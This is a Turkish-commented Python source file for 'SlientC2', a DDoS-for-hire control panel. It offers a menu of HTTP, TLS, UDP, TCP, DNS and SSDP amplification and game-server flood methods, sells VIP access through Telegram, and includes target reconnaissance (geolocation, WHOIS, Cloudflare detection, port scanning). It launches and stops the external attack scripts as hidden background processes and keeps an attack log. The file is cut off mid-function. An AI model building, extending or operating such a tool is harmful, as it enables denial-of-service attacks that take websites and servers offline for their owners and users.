#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 – Gelişmiş DDoS Aracı + VIP Sistemi + Method Paneli

import os
import sys
import time
import subprocess
import getpass
import random
import datetime
import json
import signal
import socket
import ssl
import requests
import whois
from urllib.parse import urlparse
from colorama import Fore, init, Style, Back

init(autoreset=True)

if os.name == 'nt':
    os.system("chcp 65001 > nul")
try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# ========== AKTİF PROSESLER ==========
active_processes = []

# ========== VIP SİSTEMİ ==========
VIP_FILE = "vip_users.json"

# Varsayılan admin (tek hesap)
ADMIN_USER = "Zeldy"
ADMIN_PASS = "admin123"

# Mevcut kullanıcı (login sonrası atanır)
CURRENT_USER = None
IS_VIP = False

def load_vip_users():
    """VIP kullanıcıları JSON'dan yükle"""
    try:
        with open(VIP_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        # İlk çalıştırma: boş liste
        return {"vip_users": []}

def save_vip_users(data):
    """VIP kullanıcıları JSON'a kaydet"""
    with open(VIP_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_vip_user(username):
    """Kullanıcı VIP mi kontrol et"""
    data = load_vip_users()
    return username in data.get("vip_users", [])

# ========== 8 RENK TEMASI ==========
TEMA_VARSAYILAN = 1
TEMALAR = {
    1: {"isim": "Varsayılan (Mavi-Mor)", "palet": [255, 254, 253, 117, 81, 45, 39, 45, 81, 117, 153, 189, 255]},
    2: {"isim": "Kırmızı-Turuncu", "palet": [196, 202, 208, 214, 220, 226, 220, 214, 208, 202, 196]},
    3: {"isim": "Yeşil-Açık Yeşil", "palet": [46, 82, 118, 154, 190, 226, 190, 118, 82, 46]},
    4: {"isim": "Sarı-Beyaz", "palet": [226, 229, 231, 255, 231, 229, 226]},
    5: {"isim": "Pembe-Mor", "palet": [206, 212, 218, 224, 230, 236, 230, 224, 218, 212, 206]},
    6: {"isim": "Mavi-Gökyüzü", "palet": [33, 69, 105, 141, 177, 213, 177, 141, 105, 69, 33]},
    7: {"isim": "Gri-Beyaz (Sade)", "palet": [244, 246, 248, 250, 252, 254, 252, 250, 248, 246, 244]},
    8: {"isim": "Kırmızı-Beyaz", "palet": [160, 196, 203, 210, 217, 224, 231]}
}

mevcut_tema = 1
line_palette = TEMALAR[mevcut_tema]["palet"].copy()

def tema_degistir(tema_no):
    global mevcut_tema, line_palette
    if tema_no in TEMALAR:
        mevcut_tema = tema_no
        line_palette = TEMALAR[tema_no]["palet"].copy()
        return True
    return False

def tema_listele():
    print("\nMevcut Renk Temaları:")
    for no, t in TEMALAR.items():
        aktif = " (Aktif)" if no == mevcut_tema else ""
        print(f"  {no}: {t['isim']}{aktif}")
    print("Kullanım: theme <numara>  (örnek: theme 8)")

# ========== SALDIRI GEÇMİŞİ ==========
HISTORY_FILE = "attack_history.json"

def history_ekle(target, port, duration, method, threads):
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        history = []

    entry = {
        "tarih": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hedef": target,
        "port": port,
        "sure": duration,
        "metod": method,
        "thread": threads,
        "kullanici": CURRENT_USER
    }
    history.append(entry)

    with open(HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def history_listele():
    try:
        with open(HISTORY_FILE, 'r') as f:
            history = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return

    if not history:
        print("\n[!] Henüz hiç saldırı kaydı yok.\n")
        return

    print("\n" + gradient_text("╔══════════════════════════════════════════════════════════════════════╗"))
    print(gradient_text("║                           SALDIRI GEÇMİŞİ                                     ║"))
    print(gradient_text("╠══════════════════════════════════════════════════════════════════════╣"))
    for i, entry in enumerate(history[-20:], 1):
        user = entry.get('kullanici', 'N/A')
        line = f"  {i}. [{entry['tarih']}] {entry['metod']} -> {entry['hedef']}:{entry['port']} ({entry['sure']}s) [{user}]"
        print(gradient_text("║ " + line.ljust(70) + "║"))
    print(gradient_text("╚══════════════════════════════════════════════════════════════════════╝\n"))

# ========== GRADIENT TEXT ==========
def gradient_text(text):
    if not line_palette or len(line_palette) == 0:
        return text
    result = ""
    color_index = 0
    for char in text:
        color = line_palette[color_index % len(line_palette)]
        result += f"\033[38;5;{color}m{char}"
        color_index += 1
    return result + "\033[0m"

def gradient_bg_text(text, palette):
    result = ""
    for i, char in enumerate(text):
        color = palette[i % len(palette)]
        result += f"\033[48;5;{color}m{char}"
    return result + "\033[0m"

# ========== RENK YARDIMCILARI ==========
def color_name_to_rgb(name):
    name = name.lower()
    colors = {
        "black": (0,0,0), "red": (255,0,0), "green": (0,255,0),
        "yellow": (255,255,0), "blue": (0,0,255), "magenta": (255,0,255),
        "cyan": (0,255,255), "white": (255,255,255),
        "orange": (255,165,0), "pink": (255,192,203), "purple": (128,0,128)
    }
    return colors.get(name, (255,255,255))

def rgb_to_256(r, g, b):
    if r == g == b:
        if r < 8:
            return 16
        if r > 248:
            return 231
        return round(((r - 8) / 247) * 24) + 232
    return 16 + (36 * round(r / 255 * 5)) + (6 * round(g / 255 * 5)) + round(b / 255 * 5)

def color_name_to_256(name):
    r, g, b = color_name_to_rgb(name)
    return rgb_to_256(r, g, b)

def build_gradient_palette(colors, length):
    if len(colors) < 2:
        return [color_name_to_256(colors[0])] * length

    red_to_white = [
        160, 161, 162, 163, 164, 165, 166, 167, 168, 169,
        170, 171, 172, 173, 174, 175, 176, 177, 178, 179,
        180, 181, 182, 183, 184, 185, 186, 187, 188, 189,
        190, 191, 192, 193, 194, 195, 196, 197, 198, 199,
        200, 201, 202, 203, 204, 205, 206, 207, 208, 209,
        210, 211, 212, 213, 214, 215, 216, 217, 218, 219,
        220, 221, 222, 223, 224, 225, 226, 227, 228, 229,
        230, 231
    ]

    if len(colors) == 2:
        c1 = colors[0].lower()
        c2 = colors[1].lower()
        if (c1 == "red" and c2 == "white") or (c1 == "white" and c2 == "red"):
            if c1 == "red":
                palette = red_to_white[:]
            else:
                palette = red_to_white[::-1]
            result = []
            for i in range(length):
                idx = int(i / length * (len(palette) - 1))
                result.append(palette[idx])
            return result

    palette = []
    total_segments = len(colors) - 1
    segment_length = max(5, length // total_segments)
    for i in range(total_segments):
        c1 = colors[i]
        c2 = colors[i + 1]
        r1, g1, b1 = color_name_to_rgb(c1)
        r2, g2, b2 = color_name_to_rgb(c2)
        for j in range(segment_length):
            if len(palette) >= length:
                break
            ratio = j / segment_length if segment_length > 0 else 0
            r = int((1 - ratio) * r1 + ratio * r2)
            g = int((1 - ratio) * g1 + ratio * g2)
            b = int((1 - ratio) * b1 + ratio * b2)
            palette.append(rgb_to_256(r, g, b))
    while len(palette) < length:
        palette.append(color_name_to_256(colors[-1]))
    return palette[:length]

pad = " " * 4
small_pad = " " * 7

ascii_art = [
"         ╔═╗ ╦   ╦ ╔═╗ ╔╗╔ ╔╦╗",
"         ╚═╗ ║   ║ ║╣  ║║║  ║ ",
"         ╚═╝ ╚═╝ ╩ ╚═╝ ╝╚╝  ╩ "
]

def show_logo_and_boxes():
    os.system('clear')
    for line in ascii_art:
        print(gradient_text(pad + line))
    print(gradient_text(pad + "╔════════════════════════════════════╗"))
    print(gradient_text(pad + "║        DdoS Attack Tool            ║"))
    print(gradient_text(pad + "║      Telegram: @SlientBotnet       ║"))
    print(gradient_text(pad + "╚════════════════════════════════════╝"))
    print(gradient_text(small_pad + "╔══════════════════════════════╗"))
    print(gradient_text(small_pad + "║    write 'help' for usage    ║"))
    print(gradient_text(small_pad + "╚══════════════════════════════╝"))
    print("\n")
    user_status = "VIP" if IS_VIP else "NORMAL"
    print(f"[!] Kullanıcı: {CURRENT_USER} ({user_status})")
    print("[!] 'menu' ile tüm methodları gör.")
    print("[!] 'stop' ile tüm saldırıları durdurabilirsiniz.\n")

# ========== LOGIN ==========
def login():
    global CURRENT_USER, IS_VIP
    os.system('clear')
    print(gradient_text(pad + "╔═════════════════════════════════════╗"))
    print(gradient_text(pad + "║      Slient DdoS Login              ║"))
    print(gradient_text(pad + "║   For the password: t.me/SlientBotnet║"))
    print(gradient_text(pad + "╚═════════════════════════════════════╝"))
    username = input("Username:  ").strip()
    password = getpass.getpass("password: ").strip()

    # Admin kontrolü
    if username == ADMIN_USER and password == ADMIN_PASS:
        CURRENT_USER = username
        IS_VIP = True
        os.system('clear')
        print(f'\033[38;2;255;50;50m[ ADMIN ]\033[0m | \033[38;2;0;255;255mWelcome {username} !\033[0m | \033[38;2;233;233;233mOwner: Zeldy\033[0m')
        time.sleep(0.5)
        return True

    # VIP kullanıcı kontrolü (JSON'dan)
    data = load_vip_users()
    vip_list = data.get("vip_users", [])
    for user in vip_list:
        if user.get("username") == username and user.get("password") == password:
            CURRENT_USER = username
            IS_VIP = True
            os.system('clear')
            print(f'\033[38;2;255;215;0m[ VIP ]\033[0m | \033[38;2;0;255;255mWelcome {username} !\033[0m | \033[38;2;233;233;233mSlientC2\033[0m')
            time.sleep(0.5)
            return True

    # Normal kullanıcı (misafir)
    if username and password:
        CURRENT_USER = username
        IS_VIP = False
        os.system('clear')
        print(f'\033[38;2;200;200;200m[ GUEST ]\033[0m | \033[38;2;0;255;255mWelcome {username} !\033[0m | \033[38;2;233;233;233mSadece DEFL methodlar\033[0m')
        time.sleep(0.5)
        return True

    print("\n[!] Kullanıcı adı veya şifre boş olamaz!")
    time.sleep(2)
    return False

# ========== PROMPT ÖZELLEŞTİRME ==========
PROMPT_STYLE = 1
PROMPT_SEGMENT_1 = " mooncnc • semp "
PROMPT_SEGMENT_2 = " ▶▶ "

PROMPT_COLOR_1 = "white"
PROMPT_COLOR_2 = "red"
PROMPT_COLOR_3 = "white"
PROMPT_COLOR_4 = "black"
PROMPT_COLOR_5 = "black"

PROMPT_GRADIENT = False
PROMPT_GRADIENT_TYPE = None

COLOR_MAP = {
    "black": Fore.BLACK, "red": Fore.RED, "green": Fore.GREEN,
    "yellow": Fore.YELLOW, "blue": Fore.BLUE, "magenta": Fore.MAGENTA,
    "cyan": Fore.CYAN, "white": Fore.WHITE, "reset": Fore.RESET
}
BG_COLOR_MAP = {
    "black": Back.BLACK, "red": Back.RED, "green": Back.GREEN,
    "yellow": Back.YELLOW, "blue": Back.BLUE, "magenta": Back.MAGENTA,
    "cyan": Back.CYAN, "white": Back.WHITE, "reset": Back.RESET
}

def parse_color(color_str, is_bg=False):
    color_str = color_str.lower()
    if is_bg:
        return BG_COLOR_MAP.get(color_str, Back.RESET)
    return COLOR_MAP.get(color_str, Fore.RESET)

def prompt():
    global PROMPT_GRADIENT, PROMPT_GRADIENT_TYPE, PROMPT_STYLE
    if PROMPT_STYLE == 1:
        color = parse_color(PROMPT_COLOR_1)
        print(f"{color}┌──[SlientC2] - [SlientC2/root]\033[0m")
        print(f"{color}└─➤  \033[0m", end="")
        sys.stdout.flush()
        return input()

    elif PROMPT_STYLE == 2:
        full_text = PROMPT_SEGMENT_1 + PROMPT_SEGMENT_2
        if PROMPT_GRADIENT:
            if PROMPT_GRADIENT_TYPE == "tool":
                palette = line_palette
            elif isinstance(PROMPT_GRADIENT_TYPE, list) and len(PROMPT_GRADIENT_TYPE) >= 2:
                palette = build_gradient_palette(PROMPT_GRADIENT_TYPE, len(full_text))
            else:
                palette = [255] * len(full_text)
            result = ""
            for i, char in enumerate(full_text):
                color = palette[i % len(palette)]
                result += f"\033[48;5;{color}m\033[38;5;16m{char}"
            result += "\033[0m"
            print(result, end=" ")
            sys.stdout.flush()
            return input()
        else:
            bg1 = parse_color(PROMPT_COLOR_2, is_bg=True)
            fg1 = parse_color(PROMPT_COLOR_4)
            bg2 = parse_color(PROMPT_COLOR_3, is_bg=True)
            fg2 = parse_color(PROMPT_COLOR_5)
            custom_prompt = (
                f"{bg1}{fg1}{PROMPT_SEGMENT_1}"
                f"{bg2}{fg2}{PROMPT_SEGMENT_2}"
                f"{Style.RESET_ALL} "
            )
            print(custom_prompt, end="")
            sys.stdout.flush()
            return input()

    elif PROMPT_STYLE == 3:
        color = parse_color(PROMPT_COLOR_1)
        print(f"{color}┌──[SlientC2] - [SlientC2/root]\033[0m")
        print(f"{color}└─ $ \033[0m", end="")
        sys.stdout.flush()
        return input()

    else:
        print("┌──[SlientC2] - [SlientC2/root]")
        print("└─➤  ", end="")
        return input()

# ========== PROMPT KOMUTLARI ==========
def cmd_promptstyle(args):
    global PROMPT_STYLE
    if len(args) < 1:
        print("[!] Kullanım: promptstyle <1|2|3>")
        return
    try:
        style = int(args[0])
        if style in (1, 2, 3):
            PROMPT_STYLE = style
            print(f"[+] Prompt stili {style} olarak değiştirildi.")
        else:
            print("[!] Sadece 1, 2 veya 3 girin.")
    except ValueError:
        print("[!] Lütfen 1, 2 veya 3 girin.")

def cmd_setprompt(args):
    global PROMPT_SEGMENT_1
    if PROMPT_STYLE != 2:
        print("[!] Bu komut sadece stil 2 aktifken çalışır.")
        return
    if len(args) >= 1:
        new_text = " ".join(args)
        PROMPT_SEGMENT_1 = f" {new_text} "
        print(f"[+] Prompt: {PROMPT_SEGMENT_1}{PROMPT_SEGMENT_2}")

def cmd_promptcolor(args):
    global PROMPT_GRADIENT, PROMPT_GRADIENT_TYPE
    global PROMPT_COLOR_1, PROMPT_COLOR_2, PROMPT_COLOR_3, PROMPT_COLOR_4, PROMPT_COLOR_5
    valid_colors = ["black","red","green","yellow","blue","magenta","cyan","white","orange","pink","purple"]
    if len(args) == 0:
        print("\n[?] Kullanım:")
        print("  promptcolor 1 <renk>                   → Stil 1 yazı rengi")
        print("  promptcolor 2 <bg1> <bg2> <fg1> <fg2>  → Stil 2 renkler")
        print("  promptcolor 3 <renk>                   → Stil 3 yazı rengi")
        print("  promptcolor gradient <r1> <r2>         → Stil 2 gradient")
        print("  promptcolor tool                       → Tool teması")
        print("  promptcolor off                        → Gradient kapat")
        return
    if args[0].lower() == "off":
        PROMPT_GRADIENT = False
        PROMPT_GRADIENT_TYPE = None
        print("[+] Gradient kapatıldı.")
        return
    if args[0].lower() == "tool":
        PROMPT_GRADIENT = True
        PROMPT_GRADIENT_TYPE = "tool"
        PROMPT_STYLE = 2
        print("[+] Stil 2 gradient -> Tool teması.")
        return
    if args[0].lower() == "gradient":
        if len(args) < 3:
            print("[!] En az 2 renk gerekli.")
            return
        colors = [c.lower() for c in args[1:]]
        for c in colors:
            if c not in valid_colors:
                print(f"[!] Geçersiz renk: {c}")
                return
        PROMPT_GRADIENT = True
        PROMPT_GRADIENT_TYPE = colors
        PROMPT_STYLE = 2
        print(f"[+] Gradient: {', '.join(colors)}")
        return
    if args[0] == "1":
        if len(args) < 2:
            print("[!] Kullanım: promptcolor 1 <renk>")
            return
        c = args[1].lower()
        if c not in valid_colors:
            print(f"[!] Geçersiz renk: {c}")
            return
        PROMPT_COLOR_1 = c
        PROMPT_STYLE = 1
        print(f"[+] Stil 1 renk: {c}")
        return
    if args[0] == "2":
        if len(args) < 5:
            print("[!] Kullanım: promptcolor 2 <bg1> <bg2> <fg1> <fg2>")
            return
        for c in args[1:5]:
            if c.lower() not in valid_colors:
                print(f"[!] Geçersiz renk: {c}")
                return
        PROMPT_COLOR_2 = args[1].lower()
        PROMPT_COLOR_3 = args[2].lower()
        PROMPT_COLOR_4 = args[3].lower()
        PROMPT_COLOR_5 = args[4].lower()
        PROMPT_STYLE = 2
        PROMPT_GRADIENT = False
        print(f"[+] Stil 2 renkleri güncellendi.")
        return
    if args[0] == "3":
        if len(args) < 2:
            print("[!] Kullanım: promptcolor 3 <renk>")
            return
        c = args[1].lower()
        if c not in valid_colors:
            print(f"[!] Geçersiz renk: {c}")
            return
        PROMPT_COLOR_1 = c
        PROMPT_STYLE = 3
        print(f"[+] Stil 3 renk: {c}")
        return
    print("[!] Geçersiz parametre. 'promptcolor' yaz.")

# ========== SALDIRI BANNER ==========
def show_attack_banner(target, port, duration, method, threads=None, vip=True, expiry=864.70, cooldown=0.00):
    os.system('clear')
    now = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    sent_by = CURRENT_USER if CURRENT_USER else "root"
    vip_str = "true" if vip else "false"
    method_upper = method.upper()

    attacksent_art = [
        "╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗",
        "╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║ ",
        "╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩ "
    ]
    for line in attacksent_art:
        print(gradient_text(pad + line.center(60)))

    width = 60
    border = "═" * (width - 2)
    empty = " " * (width - 2)
    def left(text):
        return text.ljust(width - 2)

    print(gradient_text(pad + "╔" + border + "╗"))
    print(gradient_text(pad + "║" + left(f"  Target: [{target}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Time: [{duration}]s") + "║"))
    print(gradient_text(pad + "║" + left(f"  Port: [{port}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Method: [{method_upper}]") + "║"))
    print(gradient_text(pad + "╠" + "═" * (width - 2) + "╣"))
    if threads is not None:
        print(gradient_text(pad + "║" + left(f"  Threads: [{threads}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  VIP: {vip_str}") + "║"))
    print(gradient_text(pad + "║" + left(f"  Expiry: [{expiry:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Cooldown: [{cooldown:.2f}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Timestamp: [{now}]") + "║"))
    print(gradient_text(pad + "║" + left(f"  Sent by: [{sent_by}]") + "║"))
    print(gradient_text(pad + "║" + empty + "║"))
    print(gradient_text(pad + "║" + left("  Join: t.me/artichetm2") + "║"))
    print(gradient_text(pad + "║" + left("  Discord: @articnetxv") + "║"))
    print(gradient_text(pad + "╚" + border + "╝"))
    print("\n" + Fore.CYAN + "[*] Saldırı başlatılıyor... (stop ile durdurabilirsiniz)" + Fore.WHITE + "\n")

# ========== VIP KONTROL ==========
def check_vip(method_name):
    """VIP method mu kontrol et. True = izin var, False = izin yok"""
    if IS_VIP:
        return True
    print(f"\n[!] '{method_name}' methodu VIP gerektirir!")
    print("[!] VIP olmak için: t.me/SlientBotnet\n")
    return False

# ========== METHOD PANELİ ==========
def cmd_menu():
    os.system('clear')
    c = line_palette[0] if line_palette else 196
    r = "\033[0m"
    vip_color = "\033[38;5;196m"  # kırmızı
    defl_color = "\033[38;5;46m"  # yeşil
    title_color = "\033[38;5;51m"  # cyan
    border = f"\033[38;5;{c}m"

    user_status = "VIP" if IS_VIP else "NORMAL"

    print(f"{border}╔══════════════════════════════════════════════════════════════════╗{r}")
    print(f"{border}║{title_color}                    SLIENT C2 - METHOD PANEL                      {border}║{r}")
    print(f"{border}╠══════════════════════════════════════════════════════════════════╣{r}")
    print(f"{border}║{r} Kullanıcı: {CURRENT_USER} | Durum: {user_status:<48}{border}║{r}")
    print(f"{border}╠══════════════════════════════════════════════════════════════════╣{r}")

    # LAYER 7
    print(f"{border}║{title_color} [ LAYER 7 ]                                                      {border}║{r}")
    print(f"{border}║{r}  httpflood...... <url> <thread> <method> <time>    {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  cfpro.......... <url> <thread> <time>             {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  flood.......... <url> <time> <thread>             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  http-raw....... <url> <time>                      {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  http-socket.... <url> <thread> <time>             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  http-rand...... <url> <time>                      {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  https-spoof.... <url> <time> <thread>             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  tls............ <url> <time> <thread>             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  tls2........... <url> <time> <thread>             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  tls3........... <url> <time> <thread>             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  httpflood2..... <url> <time>                      {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  slow........... <url> <time>                      {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  rapid.......... <url> <time> <thread>             {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  uambypass...... <url> <time> <thread>             {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  httpsbypass.... <url> <time> <thread>             {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}╠══════════════════════════════════════════════════════════════════╣{r}")

    # LAYER 4
    print(f"{border}║{title_color} [ LAYER 4 ]                                                      {border}║{r}")
    print(f"{border}║{r}  udp............ <ip> <port> <time>                {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  tcpflood....... <ip> <port> <thread> <time> <pps> {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  dnsamp......... <ip/url> <time> <thread>          {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  ssdp........... <ip> <time> <thread>              {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}╠══════════════════════════════════════════════════════════════════╣{r}")

    # GAME
    print(f"{border}║{title_color} [ GAME ]                                                         {border}║{r}")
    print(f"{border}║{r}  fortnite....... <ip> <port> <time> <pps> <payload> {defl_color}[DEFL]{border} ║{r}")
    print(f"{border}║{r}  fivem.......... <ip> <time>                       {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  minecraft...... <ip> <port> <time>                {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}║{r}  browser........ <url> <time>                      {vip_color}[VIP] {border}  ║{r}")
    print(f"{border}╠══════════════════════════════════════════════════════════════════╣{r}")

    # EXTRA
    print(f"{border}║{title_color} [ EXTRA ]                                                        {border}║{r}")
    print(f"{border}║{r}  info........... <ip/url>                          {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  promptstyle.... <1|2|3>                           {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  promptcolor.... <...>                             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  theme.......... <1-8>                             {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  setprompt...... <metin>                           {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}║{r}  stop...........                                   {defl_color}[DEFL]{border}  ║{r}")
    print(f"{border}╚══════════════════════════════════════════════════════════════════╝{r}")
    print()
    print("[!] VIP methodlar için VIP hesap gerekir.")
    print("[!] VIP olmak için: t.me/SlientBotnet\n")

# ========== ADMIN KOMUTLARI ==========
def cmd_addvip(args):
    """Admin: VIP kullanıcı ekle"""
    global CURRENT_USER, IS_VIP
    if CURRENT_USER != ADMIN_USER:
        print("[!] Bu komut sadece admin tarafından kullanılabilir!")
        return
    if len(args) < 2:
        print("[!] Kullanım: addvip <kullanici_adi> <sifre>")
        print("Örnek: addvip ahmet 12345")
        return
    username = args[0]
    password = args[1]
    data = load_vip_users()
    # Aynı kullanıcı var mı?
    for u in data["vip_users"]:
        if u["username"] == username:
            u["password"] = password
            save_vip_users(data)
            print(f"[+] VIP kullanıcı güncellendi: {username}")
            return
    data["vip_users"].append({"username": username, "password": password})
    save_vip_users(data)
    print(f"[+] VIP kullanıcı eklendi: {username}")

def cmd_delvip(args):
    """Admin: VIP kullanıcı sil"""
    global CURRENT_USER
    if CURRENT_USER != ADMIN_USER:
        print("[!] Bu komut sadece admin tarafından kullanılabilir!")
        return
    if len(args) < 1:
        print("[!] Kullanım: delvip <kullanici_adi>")
        return
    username = args[0]
    data = load_vip_users()
    original_len = len(data["vip_users"])
    data["vip_users"] = [u for u in data["vip_users"] if u["username"] != username]
    if len(data["vip_users"]) < original_len:
        save_vip_users(data)
        print(f"[+] VIP kullanıcı silindi: {username}")
    else:
        print(f"[!] Kullanıcı bulunamadı: {username}")

def cmd_listvip(args):
    """Admin: VIP kullanıcıları listele"""
    global CURRENT_USER
    if CURRENT_USER != ADMIN_USER:
        print("[!] Bu komut sadece admin tarafından kullanılabilir!")
        return
    data = load_vip_users()
    vip_list = data.get("vip_users", [])
    print(f"\n[+] VIP Kullanıcılar ({len(vip_list)}):")
    if not vip_list:
        print("    (boş)")
    else:
        for i, u in enumerate(vip_list, 1):
            print(f"    {i}. {u['username']} / {u['password']}")
    print()

# ========== INFO ==========
def info_get_ip(target):
    try:
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
        else:
            hostname = target
        ip = socket.gethostbyname(hostname)
        return ip, hostname
    except Exception as e:
        return None, str(e)

def info_get_geo(ip):
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return resp.json()
    except Exception as e:
        return {"error": str(e)}

def info_get_whois(domain):
    try:
        return whois.whois(domain)
    except Exception as e:
        return {"error": str(e)}

def info_check_cloudflare(url):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        server = resp.headers.get("Server", "").lower()
        cf_ray = resp.headers.get("CF-RAY", "")
        if "cloudflare" in server or cf_ray:
            return "EVET (Cloudflare aktif)"
        return "HAYIR"
    except Exception as e:
        return f"Kontrol edilemedi: {e}"

def info_check_http(url):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        start = time.time()
        resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        elapsed = (time.time() - start) * 1000
        return resp.status_code, resp.headers.get("Server", "N/A"), f"{elapsed:.0f}ms"
    except Exception as e:
        return None, None, str(e)

def info_scan_ports(ip, ports=[21,22,23,25,53,80,110,143,443,445,3306,3389,8080]):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

def cmd_info(args):
    if len(args) < 1:
        print("[!] Kullanım: info <IP veya URL>")
        return
    target = args[0]
    show_attack_banner(target, "N/A", "0", "INFO", threads="Keşif", vip=True)
    print(f"[*] Hedef: {target}")
    ip, hostname = info_get_ip(target)
    if not ip:
        print(f"[!] IP çözümlenemedi: {hostname}")
        return
    print(f"[+] IP Adresi: {ip}")
    print(f"[+] Hostname: {hostname}")
    geo = info_get_geo(ip)
    if "error" not in geo:
        print(f"\n[+] Konum Bilgisi:")
        print(f"    Şehir: {geo.get('city', 'N/A')}")
        print(f"    Bölge: {geo.get('region', 'N/A')}")
        print(f"    Ülke: {geo.get('country', 'N/A')}")
        print(f"    ISP/Org: {geo.get('org', 'N/A')}")
        print(f"    Timezone: {geo.get('timezone', 'N/A')}")
        print(f"    Koordinat: {geo.get('loc', 'N/A')}")
    if target.startswith("http"):
        status, server, rtime = info_check_http(target)
        if status:
            print(f"\n[+] HTTP Durum:")
            print(f"    Durum Kodu: {status}")
            print(f"    Server: {server}")
            print(f"    Yanıt Süresi: {rtime}")
        print(f"\n[+] Cloudflare Koruması: {info_check_cloudflare(target)}")
        domain = urlparse(target).hostname
        if domain and not domain.replace(".", "").isdigit():
            print(f"\n[+] WHOIS Bilgisi ({domain}):")
            w = info_get_whois(domain)
            if "error" not in w:
                print(f"    Registrar: {w.registrar}")
                print(f"    Oluşturma: {w.creation_date}")
                print(f"    Son Kullanma: {w.expiration_date}")
                print(f"    Name Servers: {w.name_servers}")
    print(f"\n[+] Açık Portlar (yaygın):")
    open_ports = info_scan_ports(ip)
    if open_ports:
        for p in open_ports:
            print(f"    {p} - AÇIK")
    else:
        print("    Açık port bulunamadı.")
    print("\n" + "="*50 + "\n")

# ========== ÇIKTI KONTROL ==========
CIKTI_GOSTER = False

def cmd_cikti_goster():
    global CIKTI_GOSTER
    CIKTI_GOSTER = True
    print("[+] Saldırı çıktıları AÇILDI.")

def cmd_cikti_kapan():
    global CIKTI_GOSTER
    CIKTI_GOSTER = False
    print("[+] Saldırı çıktıları KAPATILDI.")

# ========== STOP ==========
def cmd_stop():
    global active_processes
    killed = 0
    for proc in active_processes:
        try:
            proc.terminate()
            killed += 1
        except:
            pass
    active_processes.clear()
    try:
        for pattern in ["node", "udp.py|cf-pro.py|goldeneye.py|https-spoof.py|fortnite.py|icmp.py|minecraft.py|dnsamp.py|ssdp.py|hybrid.py",
                        "httpflood.go|raw.http.go|rapid", "tcpflood", "fivem.pl", "browser.js", "minecraft", "uambypass.js"]:
            result = subprocess.run(["pgrep", "-f", pattern], capture_output=True, text=True)
            if result.stdout:
                for pid in result.stdout.strip().split('\n'):
                    try:
                        os.kill(int(pid), signal.SIGTERM)
                        killed += 1
                    except:
                        pass
    except Exception:
        pass
    if killed > 0:
        print(f"[+] {killed} saldırı prosesi sonlandırıldı.")
    else:
        print("[!] Çalışan saldırı prosesi bulunamadı.")

# ========== ÇALIŞTIRICILAR ==========
def run_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        possible = [f for f in os.listdir('.') if f.lower() == script_name.lower()]
        if possible:
            script_name = possible[0]
        else:
            print(f"[!] {script_name} dosyası bulunamadı!")
            return
    cmd = ["python3", script_name] + args
    try:
        proc = subprocess.Popen(cmd) if CIKTI_GOSTER else subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_processes.append(proc)
    except Exception as e:
        print(f"[!] Beklenmeyen hata: {e}")

def run_go_script(script_name, args):
    global active_processes
    if not os.path.exists(script_name):
        print(f"[!] {script_name} dosyası bulunamadı!")
